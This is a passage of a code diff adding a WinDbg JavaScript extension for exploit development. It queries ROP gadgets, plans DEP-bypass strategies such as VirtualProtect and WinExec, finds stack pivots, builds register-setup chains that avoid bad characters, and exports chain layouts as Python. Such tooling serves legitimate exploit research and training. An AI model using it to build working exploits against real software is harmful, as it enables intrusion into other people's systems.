+        read: "reads",
+        preserve: "preserves",
+        preservethroughout: "preservesThroughout",
+        cap: "capability",
+        capabilities: "capability",
+        term: "terminator",
+        stackdelta: "stackDelta",
+        memorywrite: "memoryWrite",
+        memoryread: "memoryRead"
+      };
+      if (isPlainObject(args[0])) {
+        const _a = args[0], { verbose: requestedVerbose } = _a, queryFields = __objRest(_a, ["verbose"]);
+        verbose = requestedVerbose === true;
+        query = queryFields;
+      } else if (typeof args[0] === "string" && args[1] !== void 0) {
+        const raw = args[0].trim();
+        const field = (_b = fieldAliases[raw.toLowerCase()]) != null ? _b : raw;
+        if (listFields.includes(field)) {
+          query = { [field]: [args[1]] };
+        } else if (scalarFields.includes(field)) {
+          query = { [field]: args[1] };
+        } else {
+          fieldError = `Unsupported field '${raw}'. Supported: ${[...listFields, ...scalarFields].join(", ")}.`;
+        }
+        if (query && args[2] !== void 0) {
+          query.executableOnly = Boolean(args[2]);
+        }
+        verbose = args[3] === true;
+      }
+      if (!query) {
+        const message = fieldError != null ? fieldError : "rop.query requires a supported field and value. Supported: " + [...listFields, ...scalarFields].join(", ") + ".";
+        const rows2 = [{ Error: message }];
+        renderRows("ROP Query", rows2);
+        setResult({
+          command: "rop.query",
+          args: {},
+          success: false,
+          findings: [],
+          warnings: [],
+          errors: [message]
+        });
+        return toDxResult("ROP Query", rows2);
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Query", rows2);
+        setResult({
+          command: "rop.query",
+          args: query,
+          success: false,
+          findings: [],
+          warnings: [],
+          errors: [NO_ROP_CORPUS_MESSAGE]
+        });
+        return toDxResult("ROP Query", rows2);
+      }
+      const queryStale = staleCorpusGuard("ROP Query", "rop.query");
+      if (queryStale)
+        return queryStale;
+      const gadgets = currentRopCorpus.query(query);
+      const rows = queryRows(query, verbose);
+      renderRows("ROP Query", rows);
+      setResult({
+        command: "rop.query",
+        args: __spreadProps(__spreadValues({}, query), { verbose }),
+        success: true,
+        findings: gadgets,
+        warnings: [],
+        errors: []
+      });
+      return toDxResult("ROP Query", rows);
+    };
+    const executeRopCapabilities = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.capabilities");
+      }
+      const rows = capabilityRows();
+      renderRows("ROP Capabilities", rows);
+      setResult({
+        command: "rop.capabilities",
+        args: {},
+        success: currentRopCorpus !== void 0,
+        findings: currentRopCorpus ? currentRopCorpus.gadgets : [],
+        warnings: [],
+        errors: currentRopCorpus ? [] : [NO_ROP_CORPUS_MESSAGE]
+      });
+      return toDxResult("ROP Capabilities", rows);
+    };
+    const executeRopPlan = (...args) => {
+      var _a, _b, _c;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.plan");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Plan", rows2);
+        return toDxResult("ROP Plan", rows2);
+      }
+      const options = isPlainObject(args[0]) ? args[0] : { strategy: args[0], apiResolution: args[1] };
+      const strategy = normalizeExploitStrategy(String((_a = options.strategy) != null ? _a : ""));
+      if (!strategy) {
+        const rows2 = [{ Error: "Unsupported strategy. Use VirtualProtect, VirtualAlloc, WriteProcessMemory, VirtualProtectEx, VirtualAllocEx, WinExec, or Stack Pivot." }];
+        renderRows("ROP Plan", rows2);
+        return toDxResult("ROP Plan", rows2);
+      }
+      const resolution = String((_c = (_b = options.apiResolution) != null ? _b : options.resolution) != null ? _c : "direct").toLowerCase();
+      if (resolution !== "direct" && resolution !== "iat") {
+        const rows2 = [{ Error: "API resolution must be direct or iat." }];
+        renderRows("ROP Plan", rows2);
+        return toDxResult("ROP Plan", rows2);
+      }
+      const plan = planExploitStrategy(currentRopCorpus, {
+        strategy,
+        apiResolution: resolution
+      }, nextRopPlanId++);
+      ropPlans.set(plan.id, { plan, generation: corpusGeneration });
+      const rows = strategyPlanRows(plan);
+      renderRows(`ROP Plan ${plan.id}: ${plan.strategy}`, rows);
+      setResult({
+        command: "rop.plan",
+        args: options,
+        success: plan.strategies.some((candidate) => candidate.possible),
+        findings: [plan],
+        warnings: [],
+        errors: []
+      });
+      return toDxResult(`ROP Plan ${plan.id}`, rows);
+    };
+    const executeRopEmit = (...args) => {
+      var _a, _b;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.emit");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Emit", rows2);
+        return toDxResult("ROP Emit", rows2);
+      }
+      const emitStale = staleCorpusGuard("ROP Emit", "rop.emit");
+      if (emitStale)
+        return emitStale;
+      const options = isPlainObject(args[0]) ? args[0] : { planId: args[0], strategyId: args[1] };
+      const planId = Number((_a = options.planId) != null ? _a : options.plan_id);
+      const strategyId = (_b = options.strategyId) != null ? _b : options.strategy_id;
+      const entry = ropPlans.get(planId);
+      if (!entry) {
+        const rows2 = [{ Error: `ROP plan ${Number.isFinite(planId) ? planId : "<invalid>"} does not exist. Run rop.plan(...) first.` }];
+        renderRows("ROP Emit", rows2);
+        return toDxResult("ROP Emit", rows2);
+      }
+      if (entry.generation !== corpusGeneration) {
+        const rows2 = [{ Error: `ROP plan ${planId} is stale (corpus was reloaded). Run rop.plan(...) again.` }];
+        renderRows("ROP Emit", rows2);
+        return toDxResult("ROP Emit", rows2);
+      }
+      const result3 = ropEmitter.emit(currentRopCorpus, entry.plan, strategyId === void 0 ? void 0 : Number(strategyId));
+      const rows = emissionRows(result3);
+      renderRows(`ROP Emit ${entry.plan.id}.${result3.strategyId}`, rows);
+      setResult({
+        command: "rop.emit",
+        args: options,
+        success: result3.success,
+        findings: [result3],
+        warnings: [],
+        errors: result3.success ? [] : result3.diagnostics
+      });
+      return toDxResult(`ROP Emit ${entry.plan.id}.${result3.strategyId}`, rows);
+    };
+    const executeRopSynthesize = (...args) => {
+      var _a, _b;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.synthesize");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Synthesize", rows2);
+        return toDxResult("ROP Synthesize", rows2);
+      }
+      const synthStale = staleCorpusGuard("ROP Synthesize", "rop.synthesize");
+      if (synthStale)
+        return synthStale;
+      const options = isPlainObject(args[0]) ? args[0] : __spreadValues({ planId: args[0] }, isPlainObject(args[1]) ? args[1] : {});
+      const planId = Number((_b = (_a = options.planId) != null ? _a : options.plan_id) != null ? _b : args[0]);
+      const entry = ropPlans.get(planId);
+      if (!entry) {
+        const rows2 = [{ Error: `ROP plan ${Number.isFinite(planId) ? planId : "<invalid>"} does not exist. Run rop.plan(...) first.` }];
+        renderRows("ROP Synthesize", rows2);
+        return toDxResult("ROP Synthesize", rows2);
+      }
+      if (entry.generation !== corpusGeneration) {
+        const rows2 = [{ Error: `ROP plan ${planId} is stale (corpus was reloaded). Run rop.plan(...) again.` }];
+        renderRows("ROP Synthesize", rows2);
+        return toDxResult("ROP Synthesize", rows2);
+      }
+      let state = cachedExploitState;
+      if (!state) {
+        const rows2 = [{ Error: NO_EXPLOIT_STATE_MESSAGE }];
+        renderRows("ROP Synthesize", rows2);
+        return toDxResult("ROP Synthesize", rows2);
+      }
+      const overrides = isPlainObject(args[1]) ? args[1] : {};
+      if (Object.keys(overrides).length > 0) {
+        state = mergeExploitStateOverrides(state, overrides);
+      }
+      const result3 = synthesize(currentRopCorpus, entry.plan, state);
+      const title = `ROP Synthesize ${planId}`;
+      section(title);
+      info(`Path: ${result3.entryPath}`);
+      info(`Status: ${result3.status}`);
+      info(`Layout: ${result3.layoutProduced ? "produced" : "none"}`);
+      info(`Constraint compatible: ${result3.constraintCompatible ? "yes" : "no"}`);
+      if (result3.layoutProduced) {
+        info(`Strategy: ${result3.strategy} / ${result3.shape}`);
+        info(`Total: ${result3.totalBytes} bytes`);
+        if (result3.placeholders.length > 0) {
+          info(`Resolve before use: ${result3.placeholders.join(", ")}`);
+        }
+        if (result3.pivot) {
+          info(`Pivot: ${result3.pivot.sequence} (source: ${result3.pivot.source}${result3.pivot.sourceRegister ? ` ${result3.pivot.sourceRegister}` : ""})`);
+        }
+      }
+      for (const v of result3.violations) {
+        warn(`VIOLATION: ${v.message}`);
+      }
+      for (const b of result3.blockers) {
+        error(`BLOCKER: ${b.message}`);
+      }
+      for (const w of result3.warnings) {
+        warn(w.message);
+      }
+      if (!result3.constraintCompatible && result3.layoutProduced && result3.violations.length > 0) {
+        info("Operator action: synthesize values arithmetically, use writable memory construction, or select an alternate strategy.");
+      }
+      const rows = synthesisRows(result3);
+      renderRows(title, rows);
+      setResult({
+        command: "rop.synthesize",
+        args: options,
+        success: result3.status === "complete",
+        findings: [result3],
+        warnings: [
+          ...result3.violations.map((v) => v.message),
+          ...result3.warnings.map((w) => w.message)
+        ],
+        errors: result3.blockers.map((b) => b.message)
+      });
+      return toDxResult(title, rows);
+    };
+    const executeRopExport = (...args) => {
+      var _a, _b, _c, _d, _e, _f, _g, _h;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.export");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Export", rows2);
+        return toDxResult("ROP Export", rows2);
+      }
+      const exportStale = staleCorpusGuard("ROP Export", "rop.export");
+      if (exportStale)
+        return exportStale;
+      const options = isPlainObject(args[0]) ? args[0] : { planId: args[0], path: args[1] };
+      const planId = Number((_b = (_a = options.planId) != null ? _a : options.plan_id) != null ? _b : args[0]);
+      const filePath = (_d = (_c = options.path) != null ? _c : options.file) != null ? _d : typeof args[1] === "string" ? args[1] : void 0;
+      const entry = ropPlans.get(planId);
+      if (!entry) {
+        const rows2 = [{ Error: `ROP plan ${Number.isFinite(planId) ? planId : "<invalid>"} does not exist. Run rop.plan(...) first.` }];
+        renderRows("ROP Export", rows2);
+        return toDxResult("ROP Export", rows2);
+      }
+      if (entry.generation !== corpusGeneration) {
+        const rows2 = [{ Error: `ROP plan ${planId} is stale (corpus was reloaded). Run rop.plan(...) again.` }];
+        renderRows("ROP Export", rows2);
+        return toDxResult("ROP Export", rows2);
+      }
+      const emitResult = ropEmitter.emit(currentRopCorpus, entry.plan);
+      if (!emitResult.success) {
+        const rows2 = [{ Error: `Emit failed for plan ${planId}: ${emitResult.diagnostics.join("; ")}` }];
+        renderRows("ROP Export", rows2);
+        return toDxResult("ROP Export", rows2);
+      }
+      const exportEmit = {
+        planId: emitResult.planId,
+        strategy: emitResult.strategy,
+        shape: emitResult.shape,
+        gadgets: emitResult.gadgets.map((g) => ({
+          capability: g.capability,
+          address: g.address,
+          module: g.module,
+          sequence: g.sequence
+        }))
+      };
+      let exportSynth;
+      if (cachedExploitState) {
+        const synthResult = synthesize(currentRopCorpus, entry.plan, cachedExploitState);
+        if (synthResult.layoutProduced) {
+          exportSynth = {
+            planId: synthResult.planId,
+            strategy: synthResult.strategy,
+            shape: synthResult.shape,
+            entryPath: synthResult.entryPath,
+            status: synthResult.status,
+            slots: synthResult.slots,
+            placeholders: synthResult.placeholders,
+            violations: synthResult.violations.map((v) => v.message)
+          };
+        }
+      }
+      const pythonLines = formatExportPython(exportEmit, exportSynth);
+      const title = `ROP Export ${planId}`;
+      if (typeof filePath === "string" && filePath.length > 0) {
+        const hostAny = host;
+        const exec = (_h = (_g = (_f = (_e = hostAny.namespace) == null ? void 0 : _e.Debugger) == null ? void 0 : _f.Utility) == null ? void 0 : _g.Control) == null ? void 0 : _h.ExecuteCommand;
+        if (typeof exec === "function") {
+          exec(`.logopen /u "${filePath}"`);
+          for (const line of pythonLines) {
+            host.diagnostics.debugLog(`${line}
+`);
+          }
+          exec(".logclose");
+          section(title);
+          info(`Written to ${filePath}`);
+          info(`${pythonLines.length} lines, ${exportEmit.gadgets.length} gadgets`);
+          if (exportSynth) {
+            info(`Includes stack layout (${exportSynth.slots.length} slots, ${exportSynth.entryPath})`);
+          }
+        } else {
+          section(title);
+          warn("File write unavailable (not running in WinDbg). Printing to console instead.");
+          for (const line of pythonLines) {
+            print(line);
+          }
+        }
+      } else {
+        section(title);
+        for (const line of pythonLines) {
+          print(line);
+        }
+      }
+      const rows = [
+        {
+          Plan: planId.toString(),
+          Strategy: `${exportEmit.strategy} / ${exportEmit.shape}`,
+          Gadgets: exportEmit.gadgets.length.toString(),
+          Layout: exportSynth ? `${exportSynth.slots.length} slots` : "no exploit state",
+          File: typeof filePath === "string" ? filePath : "(console)"
+        }
+      ];
+      renderRows(title, rows);
+      setResult({
+        command: "rop.export",
+        args: options,
+        success: true,
+        findings: [{ python: pythonLines, emit: exportEmit, synthesis: exportSynth }],
+        warnings: [],
+        errors: []
+      });
+      return toDxResult(title, rows);
+    };
+    const formatExploitStateRows = (state) => {
+      const rows = [];
+      rows.push({ Section: "Control", Field: "mechanism", Value: state.control.mechanism });
+      rows.push({ Section: "Control", Field: "eipControlled", Value: String(state.control.instructionPointerControlled) });
+      if (state.stack.espAtControl !== void 0) {
+        rows.push({ Section: "Stack", Field: "espAtControl", Value: `0x${(state.stack.espAtControl >>> 0).toString(16).toUpperCase().padStart(8, "0")}` });
+      }
+      rows.push({ Section: "Stack", Field: "controlledBeforeEsp", Value: state.stack.controlledBeforeEsp.toString() });
+      rows.push({ Section: "Stack", Field: "controlledAfterEsp", Value: state.stack.controlledAfterEsp.toString() });
+      rows.push({ Section: "Stack", Field: "contiguousControlledBytes", Value: state.stack.contiguousControlledBytes.toString() });
+      rows.push({ Section: "Stack", Field: "readable", Value: String(state.stack.readable) });
+      rows.push({ Section: "Stack", Field: "writable", Value: String(state.stack.writable) });
+      rows.push({ Section: "Stack", Field: "executable", Value: String(state.stack.executable) });
+      if (state.stack.alignment !== void 0) {
+        rows.push({ Section: "Stack", Field: "alignment", Value: state.stack.alignment.toString() });
+      }
+      const regNames = Object.keys(state.registers);
+      if (regNames.length > 0) {
+        for (const reg of regNames) {
+          const rs = state.registers[reg];
+          const val = rs.kind === "constant" ? `constant: 0x${(rs.value >>> 0).toString(16).toUpperCase().padStart(8, "0")}` : rs.kind === "pointer-into-controlled" ? `pointer-into-controlled: offset ${rs.offset}` : rs.kind;
+          rows.push({ Section: "Registers", Field: reg, Value: val });
+        }
+      }
+      const bc = state.constraints.badchars;
+      if (bc.length > 0) {
+        rows.push({ Section: "Constraints", Field: "badchars", Value: bc.map((b) => `0x${(b & 255).toString(16).toUpperCase().padStart(2, "0")}`).join(" ") });
+      }
+      rows.push({ Section: "Constraints", Field: "apiResolution", Value: state.constraints.apiResolution });
+      if (state.constraints.maximumPayloadLength !== void 0) {
+        rows.push({ Section: "Constraints", Field: "maximumPayloadLength", Value: state.constraints.maximumPayloadLength.toString() });
+      }
+      return rows;
+    };
+    const executeExploitState = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("exploit.state");
+      }
+      const overrides = isPlainObject(args[0]) ? args[0] : void 0;
+      if (overrides && Object.keys(overrides).length > 0) {
+        if (!cachedExploitState) {
+          cachedExploitState = {
+            control: {
+              mechanism: "saved-ret",
+              instructionPointerControlled: true
+            },
+            stack: {
+              controlledBeforeEsp: 0,
+              controlledAfterEsp: 0,
+              contiguousControlledBytes: 0,
+              readable: true,
+              writable: true,
+              executable: false
+            },
+            registers: {},
+            constraints: {
+              badchars: [],
+              apiResolution: "either"
+            }
+          };
+        }
+        cachedExploitState = mergeExploitStateOverrides(cachedExploitState, overrides);
+        section("Exploit State Updated");
+      } else if (!cachedExploitState) {
+        const rows2 = [{ Error: "No exploit state cached. Run triage() first, or set fields with exploit.state({...})." }];
+        renderRows("Exploit State", rows2);
+        return toDxResult("Exploit State", rows2);
+      } else {
+        section("Exploit State (cached)");
+      }
+      const rows = formatExploitStateRows(cachedExploitState);
+      renderRows("Exploit State", rows);
+      setResult({
+        command: "exploit.state",
+        args: overrides != null ? overrides : {},
+        success: true,
+        findings: [cachedExploitState],
+        warnings: [],
+        errors: []
+      });
+      return toDxResult("Exploit State", rows);
+    };
+    const executeExploitClear = () => {
+      cachedExploitState = void 0;
+      const rows = [{ Status: "Exploit state cleared." }];
+      section("Exploit State");
+      info("Cached exploit state cleared.");
+      renderRows("Exploit State", rows);
+      return toDxResult("Exploit State", rows);
+    };
+    const executeRopPivots = (...args) => {
+      var _a, _b;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.pivots");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Pivots", rows2);
+        return toDxResult("ROP Pivots", rows2);
+      }
+      const pivotsStale = staleCorpusGuard("ROP Pivots", "rop.pivots");
+      if (pivotsStale)
+        return pivotsStale;
+      const options = isPlainObject(args[0]) ? args[0] : { register: args[0], minDelta: args[1], verbose: args[2] === true };
+      const filterRegister = typeof options.register === "string" ? options.register.toLowerCase().trim() : void 0;
+      const minDelta = typeof options.minDelta === "number" ? options.minDelta : void 0;
+      const verbose = options.verbose === true;
+      const candidates2 = currentRopCorpus.gadgets.filter((g) => g.capabilities.some((c) => c.kind === "STACK_PIVOT" || c.kind === "STACK_ADJUST") && firstKnownAddress(g) !== void 0).sort((a, b) => {
+        const aLen = a.instructions.length;
+        const bLen = b.instructions.length;
+        if (aLen !== bLen)
+          return aLen - bLen;
+        return b.score - a.score;
+      });
+      const rows = [];
+      for (const gadget of candidates2) {
+        const addr = firstKnownAddress(gadget);
+        const { source, sourceRegister, adjustment, clobbers } = classifyPivotSource(gadget);
+        const seq = gadgetSequence(gadget);
+        const module = (_b = (_a = gadget.locations.find((l) => l.virtualAddress !== void 0)) == null ? void 0 : _a.module) != null ? _b : "unknown";
+        if (filterRegister && sourceRegister !== filterRegister)
+          continue;
+        if (minDelta !== void 0 && source === "esp-adjust") {
+          if (adjustment === void 0 || Math.abs(adjustment) < minDelta)
+            continue;
+        }
+        const addrHex = `0x${addr.toString(16).toUpperCase().padStart(8, "0")}`;
+        const compact = {
+          Address: addrHex,
+          Sequence: seq,
+          Type: source,
+          Stack: gadgetStackDisplay(gadget),
+          Score: gadget.score.toString()
+        };
+        rows.push(verbose ? __spreadProps(__spreadValues({}, compact), {
+          Source: sourceRegister != null ? sourceRegister : adjustment !== void 0 ? `ESP ${adjustment >= 0 ? "+" : ""}${adjustment}` : "indirect",
+          Clobbers: clobbers.join(", "),
+          Module: module
+        }) : compact);
+      }
+      const title = `ROP Pivots (${rows.length} found)`;
+      section(title);
+      if (rows.length === 0) {
+        warn("No pivot gadgets found in the corpus.");
+      } else {
+        info(`${rows.length} pivot gadget(s) ranked by instruction count and score.`);
+      }
+      renderRows(title, rows);
+      setResult({
+        command: "rop.pivots",
+        args: options,
+        success: rows.length > 0,
+        findings: rows,
+        warnings: [],
+        errors: []
+      });
+      return toDxResult(title, rows);
+    };
+    const parseChainTargets = (spec) => {
+      if (Array.isArray(spec)) {
+        return spec.filter((entry) => isPlainObject(entry)).map((entry) => {
+          var _a, _b;
+          return { register: String((_a = entry.register) != null ? _a : ""), value: Number((_b = entry.value) != null ? _b : 0) };
+        }).filter((target) => target.register.length > 0);
+      }
+      if (isPlainObject(spec)) {
+        return Object.entries(spec).map(([register2, value]) => ({ register: register2, value: Number(value) }));
+      }
+      return [];
+    };
+    const parseBadcharsOption = (value) => {
+      const parsed = parseHexByteList(value);
+      if (!Array.isArray(parsed)) {
+        return [];
+      }
+      return parsed.filter((entry) => Number.isInteger(entry) && entry >= 0 && entry <= 255);
+    };
+    const renderFlatFrame = (command2, title, options, plan) => {
+      const python = formatChainPython(plan);
+      section(title);
+      info(`Words: ${plan.steps.length} | Stack: ${plan.stackBytes} bytes`);
+      if (plan.badchars.length > 0) {
+        info(`Badchars: ${plan.badchars.map((byte) => `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`).join(", ")}`);
+      }
+      for (const line of python) {
+        print(line);
+      }
+      for (const warning of plan.warnings) {
+        warn(warning);
+      }
+      const rows = plan.steps.map((step) => {
+        var _a;
+        return {
+          Word: (_a = step.placeholder) != null ? _a : `0x${(step.value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
+          Meaning: step.comment
+        };
+      });
+      renderRows(title, rows);
+      setResult({
+        command: command2,
+        args: options,
+        success: plan.badcharViolations.length === 0,
+        findings: [__spreadProps(__spreadValues({}, plan), { python })],
+        warnings: plan.warnings,
+        errors: plan.badcharViolations
+      });
+      return toDxResult(title, rows);
+    };
+    const executeRopChain = (...args) => {
+      var _a, _b;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.chain");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Chain", rows2);
+        setResult({ command: "rop.chain", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("ROP Chain", rows2);
+      }
+      const options = isPlainObject(args[0]) ? args[0] : {};
+      const positionalTargets = [];
+      if (!isPlainObject(args[0])) {
+        for (let i = 0; i + 1 < args.length; i += 2) {
+          if (typeof args[i] === "string") {
+            positionalTargets.push({ register: args[i], value: Number(args[i + 1]) });
+          }
+        }
+      }
+      const targets = positionalTargets.length > 0 ? positionalTargets : parseChainTargets((_b = (_a = options.set) != null ? _a : options.targets) != null ? _b : options);
+      if (targets.length === 0) {
+        const rows2 = [{ Error: 'rop.chain requires register/value pairs, e.g. rop.chain("eax", 0xDEADBEEF).' }];
+        renderRows("ROP Chain", rows2);
+        setResult({ command: "rop.chain", args: options, success: false, findings: [], warnings: [], errors: ["No chain targets provided."] });
+        return toDxResult("ROP Chain", rows2);
+      }
+      const plan = planRegisterSetup(currentRopCorpus, targets);
+      const python = formatChainPython(plan);
+      section("ROP Chain (register setup)");
+      info(`Satisfied: ${plan.satisfied.join(", ") || "(none)"} | Stack: ${plan.stackBytes} bytes`);
+      for (const line of python) {
+        print(line);
+      }
+      const warnings = plan.unsatisfied.map((entry) => `${entry.register}: ${entry.reason}`);
+      for (const warning of warnings) {
+        warn(warning);
+      }
+      const rows = plan.steps.map((step) => ({
+        Word: step.kind === "gadget" ? `0x${step.address.toString(16).toUpperCase().padStart(8, "0")}` : `0x${(step.value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
+        Meaning: step.comment
+      }));
+      renderRows("ROP Chain", rows);
+      setResult({
+        command: "rop.chain",
+        args: options,
+        success: plan.unsatisfied.length === 0,
+        findings: [__spreadProps(__spreadValues({}, plan), { python })],
+        warnings,
+        errors: []
+      });
+      return toDxResult("ROP Chain", rows);
+    };
+    const executeRopConstruct = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.construct");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("Value Construction", rows2);
+        setResult({ command: "rop.construct", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("Value Construction", rows2);
+      }
+      const constructStale = staleCorpusGuard("Value Construction", "rop.construct");
+      if (constructStale)
+        return constructStale;
+      const register2 = typeof args[0] === "string" ? args[0].toLowerCase() : void 0;
+      const rawValue = args[1] !== void 0 ? Number(args[1]) : NaN;
+      const value = Number.isFinite(rawValue) ? rawValue >>> 0 : void 0;
+      const badchars = Array.isArray(parseHexByteList(args[2])) ? parseHexByteList(args[2]) : [];
+      const preserve = parseRegisterList(args[3]);
+      if (!register2 || value === void 0) {
+        const rows2 = [{ Error: 'rop.construct requires register and value, e.g. rop.construct("edx", 0x1000, [0x00])' }];
+        renderRows("Value Construction", rows2);
+        setResult({ command: "rop.construct", args: { register: register2, value }, success: false, findings: [], warnings: [], errors: ["Missing register or value."] });
+        return toDxResult("Value Construction", rows2);
+      }
+      const recipe = solveValue(currentRopCorpus, register2, value, badchars, preserve, buildStableAddressPredicate());
+      if (!recipe) {
+        const preserveNote = preserve.length > 0 ? ` while preserving ${preserve.join(", ")}` : "";
+        const rows2 = [{ Error: `No arithmetic construction found for ${register2} = ${hex32(value)}${preserveNote}` }];
+        renderRows("Value Construction", rows2);
+        setResult({ command: "rop.construct", args: { register: register2, value, badchars, preserve }, success: false, findings: [], warnings: [], errors: [`No recipe found for ${register2} = ${hex32(value)}${preserveNote}`] });
+        return toDxResult("Value Construction", rows2);
+      }
+      recipe.steps = fixRetImmPadding(recipe.steps);
+      section(`Value Construction: ${register2} = ${hex32(value)}`);
+      info(`Recipe: ${recipe.recipe} | Stack: ${recipe.stackBytes} bytes${recipe.scratchRegister ? ` | Scratch: ${recipe.scratchRegister}` : ""} | Clobbers: ${recipe.clobbers.join(", ")}`);
+      const collateral = recipe.clobbers.filter((r) => r !== register2 && r !== recipe.scratchRegister);
+      if (collateral.length > 0) {
+        warn(`Side effect: this recipe also changes ${collateral.join(", ")} (harmless unless you need ${collateral.length > 1 ? "them" : "it"} preserved). To keep a register live, pass it as the 4th arg, e.g. rop.construct("${register2}", ..., "<badchars>", "${collateral[0]}").`);
+      }
+      const python = formatChainPython({ steps: recipe.steps });
+      for (const line of python) {
+        print(line);
+      }
+      const rows = recipe.steps.map((step) => {
+        var _a;
+        return {
+          Type: step.kind,
+          Value: step.address !== void 0 ? hex32(step.address) : step.value !== void 0 ? hex32(step.value) : (_a = step.placeholder) != null ? _a : "",
+          Meaning: step.comment
+        };
+      });
+      renderRows("Value Construction", rows);
+      setResult({
+        command: "rop.construct",
+        args: { register: register2, value, badchars },
+        success: true,
+        findings: [{ recipe: recipe.recipe, steps: recipe.steps, scratchRegister: recipe.scratchRegister, stackBytes: recipe.stackBytes, clobbers: recipe.clobbers }],
+        warnings: [],
+        errors: []
+      });
+      return toDxResult("Value Construction", rows);
+    };
+    const executeRopSetup = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.setup");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("Register Setup", rows2);
+        setResult({ command: "rop.setup", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("Register Setup", rows2);
+      }
+      const setupStale = staleCorpusGuard("Register Setup", "rop.setup");
+      if (setupStale)
+        return setupStale;
+      const targets = parseRegisterTargets(args[0]);
+      const badchars = Array.isArray(parseHexByteList(args[1])) ? parseHexByteList(args[1]) : [];
+      if (Object.keys(targets).length === 0) {
+        const rows2 = [{ Error: 'rop.setup requires register=value pairs, e.g. rop.setup("edi=0x10001000 ebx=0x40", "00 0A 0D")' }];
+        renderRows("Register Setup", rows2);
+        setResult({ command: "rop.setup", args: {}, success: false, findings: [], warnings: [], errors: ["No target registers."] });
+        return toDxResult("Register Setup", rows2);
+      }
+      const plan = planRegisterSetupPacking(currentRopCorpus, targets, badchars, buildStableAddressPredicate());
+      section(`Register Setup: ${Object.keys(targets).join(", ")}`);
+      info(`Set ${plan.ordered.length}/${Object.keys(targets).length} register(s) | Stack: ${plan.stackBytes} bytes | Order: ${plan.ordered.join(" -> ") || "n/a"}`);
+      if (plan.steps.length > 0) {
+        const python = formatChainPython({ steps: plan.steps });
+        for (const line of python)
+          print(line);
+      }
+      if (!plan.success) {
+        warn("Some registers could not be set without clobbering a finalized one:");
+        for (const item of plan.unresolved)
+          warn(`  ${item.register}: ${item.reason}`);
+      }
+      const rows = plan.steps.map((step) => {
+        var _a;
+        return {
+          Type: step.kind,
+          Value: step.address !== void 0 ? hex32(step.address) : step.value !== void 0 ? hex32(step.value) : (_a = step.placeholder) != null ? _a : "",
+          Meaning: step.comment
+        };
+      });
+      if (rows.length === 0)
+        rows.push({ Type: "none", Value: "", Meaning: "no gadgets selected" });
+      renderRows("Register Setup", rows);
+      setResult({
+        command: "rop.setup",
+        args: { targets, badchars },
+        success: plan.success,
+        findings: [{ ordered: plan.ordered, unresolved: plan.unresolved, steps: plan.steps, stackBytes: plan.stackBytes }],
+        warnings: plan.unresolved.map((item) => `${item.register}: ${item.reason}`),
+        errors: []
+      });
+      return toDxResult("Register Setup", rows);
+    };
+    const executeRopChainVp = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.chain_vp");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP VirtualProtect Chain", rows2);
+        setResult({ command: "rop.chain_vp", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("ROP VirtualProtect Chain", rows2);
+      }
+      const chainVpStale = staleCorpusGuard("ROP VirtualProtect Chain", "rop.chain_vp");
+      if (chainVpStale)
+        return chainVpStale;
+      const options = isPlainObject(args[0]) ? args[0] : {
+        virtualProtect: args[0],
+        retGadget: args[1],
+        returnAddress: args[2],
+        lpAddress: args[3],
+        dwSize: args[4],
+        writable: args[5],
+        flNewProtect: args[6],
+        mode: args[7],
+        badchars: args[8]
+      };
+      const params = {
+        virtualProtect: options.virtualProtect !== void 0 ? Number(options.virtualProtect) : void 0,
+        retGadget: options.retGadget !== void 0 ? Number(options.retGadget) : void 0,
+        returnAddress: options.returnAddress !== void 0 ? Number(options.returnAddress) : void 0,
+        lpAddress: options.lpAddress !== void 0 ? Number(options.lpAddress) : void 0,
+        dwSize: options.dwSize !== void 0 ? Number(options.dwSize) : void 0,
+        writable: options.writable !== void 0 ? Number(options.writable) : void 0,
+        flNewProtect: options.flNewProtect !== void 0 ? Number(options.flNewProtect) : void 0,
+        mode: options.mode === "direct" ? "direct" : "ret-slide",
